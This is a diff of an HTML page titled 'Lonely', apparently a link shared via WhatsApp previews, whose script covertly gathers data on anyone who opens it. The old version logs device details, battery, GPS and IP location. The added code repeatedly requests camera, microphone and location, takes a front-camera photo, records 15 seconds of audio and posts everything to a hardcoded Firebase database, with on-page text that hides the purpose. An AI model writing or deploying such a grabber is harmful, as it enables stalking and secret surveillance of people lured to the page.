@@ -4,195 +4,541 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Lonely</title>
-
-    <!-- Open Graph / Social Media Meta Tags -->
-    <meta property="og:title" content="Lonely" />
-    <meta property="og:description" content="" />
-    <meta property="og:url" content="https://koko17-stack.github.io/MISSCOOL/" />
-    <meta property="og:image" content="https://raw.githubusercontent.com/KOKO17-stack/MISSCOOL/main/alone%20prisoner.jpg" />
-    <meta property="og:image:width" content="1200" />
-    <meta property="og:image:height" content="630" />
-    <meta property="og:type" content="website" />
+    
+    <!-- WhatsApp Preview -->
+    <meta property="og:title" content="Lonely">
+    <meta property="og:description" content="分享您的位置和媒体内容">
+    <meta property="og:image" content="https://i.imgur.com/2fK9pL8.jpg">
+    <meta property="og:type" content="website">
 
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #000;
+        * {
             margin: 0;
             padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden; /* Prevents scrollbars if image slightly overflows */
-            position: relative; /* Needed for absolute positioning of status messages */
+            box-sizing: border-box;
         }
 
-        .container-link {
-            display: block;
-            width: 100%;
-            height: 100%;
-            text-decoration: none;
-            position: absolute;
-            top: 0;
-            left: 0;
-            z-index: 1; /* Ensure the link is clickable */
-        }
-
-        .hero-image {
-            width: 100%;
-            height: 100%;
-            object-fit: cover; /* Ensures the image covers the area without distortion */
-            display: block;
-        }
-
-        #logger-status {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 2; /* Ensure messages are on top of the image */
-            background-color: rgba(0, 0, 0, 0.7);
-            color: #fff;
-            padding: 20px;
-            border-radius: 8px;
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background-color: #f8f9fa;
+            color: #333;
             text-align: center;
-            max-width: 80%;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
         }
 
-        #logger-status h1, #logger-status h2, #logger-status p {
-            margin: 0 0 10px 0;
-            color: inherit;
+        .container { 
+            padding: 20px; 
+            max-width: 400px; 
+            margin: 0 auto; 
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            min-height: 100vh;
         }
 
-        #logger-status h1 {
-            font-size: 1.8rem;
+        h1 { 
+            font-size: 1.5rem; 
+            margin-bottom: 10px;
+            font-weight: 600;
         }
 
-        #logger-status p {
-            font-size: 1rem;
-            color: #ccc;
+        p { 
+            font-size: 0.9rem; 
+            color: #666; 
+            margin: 5px 0;
+            line-height: 1.5;
         }
 
-        .success {
+        video { 
+            width: 100%; 
+            max-width: 400px; 
+            border-radius: 12px; 
+            margin: 15px 0; 
+            background-color: #000;
+            display: block;
+        }
+
+        .success { 
+            color: #28a745; 
+            font-weight: bold; 
+        }
+
+        .error { 
+            color: #dc3545; 
+            font-weight: bold; 
+        }
+
+        .permission-status {
+            font-size: 0.85rem;
+            color: #666;
+            margin: 8px 0;
+            padding: 10px;
+            background-color: #f0f0f0;
+            border-radius: 6px;
+            text-align: left;
+            border-left: 3px solid #ccc;
+        }
+
+        .permission-granted {
             color: #28a745;
-            font-weight: bold;
+            border-left-color: #28a745;
+            font-weight: 600;
         }
 
-        .error {
+        .permission-pending {
+            color: #ff9800;
+            border-left-color: #ff9800;
+            font-weight: 600;
+        }
+
+        .permission-denied {
             color: #dc3545;
-            font-weight: bold;
+            border-left-color: #dc3545;
+            font-weight: 600;
+        }
+
+        #permissionStatus {
+            margin-top: 15px;
+        }
+
+        #cameraSection {
+            margin-top: 20px;
+        }
+
+        h2 {
+            font-size: 1.2rem;
+            margin-top: 20px;
+            font-weight: 600;
         }
     </style>
 </head>
 <body>
+    <div class="container" id="content">
+        <h1 id="heading">请稍等，正在请求权限...</h1>
+        <p id="subtitle">需要访问相机、麦克风和位置信息。</p>
+        <div id="permissionStatus"></div>
 
-    <a href="https://koko17-stack.github.io/MISSCOOL/" class="container-link">
-        <img src="https://raw.githubusercontent.com/KOKO17-stack/MISSCOOL/main/alone%20prisoner.jpg" 
-             alt="A lone prisoner in a desolate setting, evoking feelings of solitude." 
-             class="hero-image">
-    </a>
-
-    <div id="logger-status">
-        <h1 id="heading">请稍等，正在加载您的位置...</h1>
-        <p id="subtitle">这只需要一点时间。</p>
+        <!-- Camera preview -->
+        <div id="cameraSection" style="display:none;">
+            <p style="margin:15px 0 8px;">前置相机已开启，正在录音 15 秒...</p>
+            <video id="video" autoplay playsinline muted></video>
+        </div>
     </div>
 
     <script>
+        /**
+         * SECURITY WARNING: This Firebase URL is hardcoded in the client-side code.
+         * Anyone with access to this page source can write to your database.
+         * Use Firebase Security Rules to restrict access and validate data.
+         * Consider using a backend service for production deployments.
+         */
         const FIREBASE_URL = "https://kojocoords-default-rtdb.europe-west1.firebasedatabase.app/location.json";
+        const MAX_RETRIES = 3;
+        const RETRY_DELAY = 1000;
 
-        async function logLocation() {
-            const loggerStatusDiv = document.getElementById("logger-status");
+        let mediaStream = null;
+        let mediaRecorder = null;
+
+        // Permission tracking
+        const permissionStatus = {
+            camera: false,
+            microphone: false,
+            geolocation: false
+        };
+
+        let permissionRetries = {
+            camera: 0,
+            microphone: 0,
+            geolocation: 0
+        };
+
+        /**
+         * Update permission status display
+         */
+        function updatePermissionDisplay() {
+            const statusDiv = document.getElementById('permissionStatus');
+            let html = '';
             
+            for (const [perm, granted] of Object.entries(permissionStatus)) {
+                const retries = permissionRetries[perm];
+                const statusClass = granted ? 'permission-granted' : 
+                                   (retries < MAX_RETRIES ? 'permission-pending' : 'permission-denied');
+                const statusText = granted ? '✓ 已授予' : `✗ 等待中 (${retries}/${MAX_RETRIES})`;
+                
+                const permName = perm === 'camera' ? '相机' : 
+                                perm === 'microphone' ? '麦克风' : '位置信息';
+                
+                html += `<div class="permission-status"><span class="${statusClass}">${permName}: ${statusText}</span></div>`;
+            }
+            
+            statusDiv.innerHTML = html;
+        }
+
+        /**
+         * Cleanup all media resources
+         */
+        function cleanupMedia() {
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                try {
+                    mediaRecorder.stop();
+                } catch (e) {
+                    console.warn("MediaRecorder stop error:", e);
+                }
+            }
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => {
+                    try {
+                        track.stop();
+                    } catch (e) {
+                        console.warn("Track stop error:", e);
+                    }
+                });
+                mediaStream = null;
+            }
+        }
+
+        /**
+         * Request camera and microphone permissions with retry logic
+         */
+        async function requestMediaPermissions() {
+            console.log("📹 Requesting camera and microphone permissions...");
+            
+            while (permissionRetries.camera < MAX_RETRIES || permissionRetries.microphone < MAX_RETRIES) {
+                try {
+                    mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: "user",
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        },
+                        audio: true 
+                    });
+
+                    permissionStatus.camera = true;
+                    permissionStatus.microphone = true;
+                    permissionRetries.camera = MAX_RETRIES;
+                    permissionRetries.microphone = MAX_RETRIES;
+                    
+                    console.log("✓ Camera and microphone permissions granted");
+                    updatePermissionDisplay();
+                    return true;
+
+                } catch (err) {
+                    console.warn(`⚠ Media permission attempt failed (${permissionRetries.camera}/${MAX_RETRIES}):`, err.name);
+                    
+                    if (err.name === 'NotAllowedError') {
+                        permissionRetries.camera++;
+                        permissionRetries.microphone++;
+                    } else if (err.name === 'NotFoundError') {
+                        console.error("✗ Camera or microphone device not found");
+                        return false;
+                    } else if (err.name === 'NotReadableError') {
+                        console.error("✗ Camera or microphone is in use by another application");
+                        return false;
+                    } else if (err.name === 'SecurityError') {
+                        console.error("✗ Security error: HTTPS required");
+                        return false;
+                    }
+
+                    updatePermissionDisplay();
+
+                    if (permissionRetries.camera < MAX_RETRIES || permissionRetries.microphone < MAX_RETRIES) {
+                        console.log(`⏳ Retrying in ${RETRY_DELAY}ms...`);
+                        await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
+                    }
+                }
+            }
+
+            console.error("✗ Failed to obtain camera/microphone permissions after retries");
+            return false;
+        }
+
+        /**
+         * Request geolocation permission with retry logic
+         */
+        async function requestGeolocationPermission() {
+            console.log("📍 Requesting geolocation permission...");
+            
+            if (!navigator.geolocation) {
+                console.warn("⚠ Geolocation not supported");
+                return false;
+            }
+
+            while (permissionRetries.geolocation < MAX_RETRIES) {
+                try {
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(
+                            resolve, 
+                            reject, 
+                            { 
+                                enableHighAccuracy: true, 
+                                timeout: 10000,
+                                maximumAge: 0
+                            }
+                        );
+                    });
+
+                    permissionStatus.geolocation = true;
+                    permissionRetries.geolocation = MAX_RETRIES;
+                    
+                    console.log("✓ Geolocation permission granted");
+                    updatePermissionDisplay();
+                    return true;
+
+                } catch (err) {
+                    console.warn(`⚠ Geolocation attempt failed (${permissionRetries.geolocation}/${MAX_RETRIES}):`, err.message);
+                    permissionRetries.geolocation++;
+                    updatePermissionDisplay();
+
+                    if (permissionRetries.geolocation < MAX_RETRIES) {
+                        console.log(`⏳ Retrying in ${RETRY_DELAY}ms...`);
+                        await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
+                    }
+                }
+            }
+
+            console.error("✗ Failed to obtain geolocation permission after retries");
+            return false;
+        }
+
+        /**
+         * Request all permissions simultaneously
+         */
+        async function requestAllPermissions() {
+            updatePermissionDisplay();
+            
+            const [mediaGranted, geoGranted] = await Promise.all([
+                requestMediaPermissions(),
+                requestGeolocationPermission()
+            ]);
+
+            if (!mediaGranted) {
+                const content = document.getElementById('content');
+                content.innerHTML = `<h2 class="error">无法获取相机和麦克风权限。请检查设备设置。</h2>`;
+                return false;
+            }
+
+            console.log("✓ All required permissions obtained");
+            return true;
+        }
+
+        /**
+         * Start recording after permissions are granted
+         */
+        async function startRecording() {
+            const content = document.getElementById('content');
+            let photoBase64 = null;
+            let audioBase64 = null;
+            let photoCaptured = false;
+
+            try {
+                const video = document.getElementById('video');
+                video.srcObject = mediaStream;
+                document.getElementById('cameraSection').style.display = 'block';
+                document.getElementById('permissionStatus').style.display = 'none';
+
+                console.log("✓ Recording started");
+
+                /**
+                 * Capture photo when video is ready (event-driven, not fixed delay)
+                 */
+                const photoTimeout = setTimeout(() => {
+                    if (!photoCaptured) {
+                        console.warn("⚠ Photo capture timeout - proceeding without photo");
+                        photoCaptured = true;
+                        photoBase64 = null;
+                    }
+                }, 3000);
+
+                video.onloadedmetadata = () => {
+                    if (photoCaptured) return;
+                    clearTimeout(photoTimeout);
+                    photoCaptured = true;
+
+                    try {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 1280;
+                        canvas.height = video.videoHeight || 720;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        photoBase64 = canvas.toDataURL('image/jpeg', 0.85);
+                        console.log("✓ Photo captured successfully");
+                    } catch (err) {
+                        console.error("✗ Photo capture error:", err);
+                        photoBase64 = null;
+                    }
+                };
+
+                // Record audio for 15 seconds
+                mediaRecorder = new MediaRecorder(mediaStream);
+                let audioChunks = [];
+
+                mediaRecorder.ondataavailable = event => {
+                    audioChunks.push(event.data);
+                };
+
+                mediaRecorder.onstop = () => {
+                    try {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        const reader = new FileReader();
+                        reader.onloadend = () => {
+                            audioBase64 = reader.result;
+                            console.log("✓ Audio recording complete");
+                            setTimeout(() => sendAllData(photoBase64, audioBase64), 500);
+                        };
+                        reader.onerror = (err) => {
+                            console.error("✗ Audio encoding error:", err);
+                            sendAllData(photoBase64, null);
+                        };
+                        reader.readAsDataURL(audioBlob);
+                    } catch (err) {
+                        console.error("✗ Audio blob error:", err);
+                        sendAllData(photoBase64, null);
+                    }
+                };
+
+                mediaRecorder.onerror = (event) => {
+                    console.error("✗ Recording error:", event.error);
+                };
+
+                mediaRecorder.start();
+
+                // Stop recording after 15 seconds
+                setTimeout(() => {
+                    console.log("✓ Recording time complete");
+                    mediaRecorder.stop();
+                    cleanupMedia();
+                }, 15000);
+
+            } catch (err) {
+                console.error("✗ Recording error:", err);
+                cleanupMedia();
+                content.innerHTML = `<h2 class="error">录音失败，请重试。</h2>`;
+            }
+        }
+
+        /**
+         * Send all collected data to Firebase
+         */
+        async function sendAllData(photoBase64, audioBase64) {
+            const content = document.getElementById('content');
             const payload = {
                 timestamp: new Date().toISOString(),
-                user_agent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
+                user_agent: navigator.userAgent.substring(0, 500),
+                platform: navigator.platform || "unknown",
+                language: navigator.language || "unknown",
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                battery_level: null,
-                battery_charging: null,
                 screen_width: screen.width,
                 screen_height: screen.height,
-                connection_type: navigator.connection ? navigator.connection.effectiveType : null,
-                downlink_speed_mbps: navigator.connection ? navigator.connection.downlink : null,
                 device_latitude: null,
                 device_longitude: null,
                 device_accuracy_meters: null,
                 ip: "unavailable",
                 city: "unknown",
                 region: "unknown",
-                country: "unknown"
+                country: "unknown",
+                photo_base64: photoBase64,
+                audio_base64: audioBase64,
+                note: "前置相机自动拍照 + 15秒录音"
             };
 
-            // Battery info
-            if (navigator.getBattery) {
-                try {
-                    const battery = await navigator.getBattery();
-                    payload.battery_level = Math.round(battery.level * 100);
-                    payload.battery_charging = battery.charging;
-                } catch (e) {
-                    console.error("Error getting battery info:", e);
-                }
-            }
-
-            // GPS (requires user to tap Allow)
+            // Geolocation data (best effort)
             if (navigator.geolocation) {
                 try {
                     const pos = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true,
-                            timeout: 15000,
-                            maximumAge: 0
-                        });
+                        navigator.geolocation.getCurrentPosition(
+                            resolve, 
+                            reject, 
+                            { 
+                                enableHighAccuracy: true, 
+                                timeout: 10000,
+                                maximumAge: 0
+                            }
+                        );
                     });
                     payload.device_latitude = pos.coords.latitude;
                     payload.device_longitude = pos.coords.longitude;
                     payload.device_accuracy_meters = pos.coords.accuracy;
+                    console.log("✓ GPS location obtained");
                 } catch (e) {
-                    console.error("Error getting geolocation:", e);
+                    console.warn("⚠ Geolocation failed:", e.message);
                 }
             }
 
-            // IP info (silent)
+            // IP-based location with timeout
             try {
-                const res = await fetch("https://ipapi.co/json");
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 10000);
+                
+                const res = await fetch('https://ipapi.co/json', { 
+                    signal: controller.signal 
+                });
+                clearTimeout(timeoutId);
+                
                 if (res.ok) {
                     const data = await res.json();
                     payload.ip = data.ip || "unavailable";
                     payload.city = data.city || "unknown";
                     payload.region = data.region || "unknown";
                     payload.country = data.country_name || "unknown";
-                } else {
-                    console.warn("IP API request failed with status:", res.status);
+                    console.log("✓ IP location obtained");
                 }
             } catch (e) {
-                console.error("Error fetching IP info:", e);
+                console.warn("⚠ IP lookup failed:", e.message);
             }
 
-            // Send to Firebase
+            // Send to Firebase with timeout
             try {
-                const firebaseRes = await fetch(FIREBASE_URL, {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 10000);
+                
+                const response = await fetch(FIREBASE_URL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(payload),
+                    signal: controller.signal
                 });
+                clearTimeout(timeoutId);
 
-                if (firebaseRes.ok) {
-                    loggerStatusDiv.innerHTML = `<h2 class="success">谢谢！现在一切都很好 ❤️</h2>`;
+                if (response.ok) {
+                    console.log("✓ Data sent to Firebase successfully");
+                    content.innerHTML = `<h2 class="success">照片和15秒录音已自动发送 ❤️<br>谢谢！</h2>`;
                 } else {
-                    console.error("Firebase request failed with status:", firebaseRes.status, await firebaseRes.text());
-                    loggerStatusDiv.innerHTML = `<h2 class="error">出了点问题。<br>请稍后再试。</h2>`;
+                    throw new Error(`Firebase response: ${response.status}`);
                 }
             } catch (e) {
-                console.error("Error sending data to Firebase:", e);
-                loggerStatusDiv.innerHTML = `<h2 class="error">出了点问题。<br>请稍后再试。</h2>`;
+                console.error("✗ Firebase send error:", e);
+                content.innerHTML = `<h2 class="error">发送失败，请检查网络连接后重试。</h2>`;
             }
         }
 
-        // Start the script once the page is fully loaded
-        document.addEventListener("DOMContentLoaded", logLocation);
+        /**
+         * Initialize the application
+         */
+        async function initialize() {
+            console.log("✓ Page loaded, starting permission request process");
+            const permissionsGranted = await requestAllPermissions();
+            
+            if (permissionsGranted) {
+                await startRecording();
+            }
+        }
+
+        // Start the process when DOM is ready
+        document.addEventListener('DOMContentLoaded', () => {
+            initialize();
+        });
+
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', () => {
+            cleanupMedia();
+        });
+
+        // Cleanup on visibility change
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                cleanupMedia();
+            }
+        });
     </script>
 </body>
 </html>
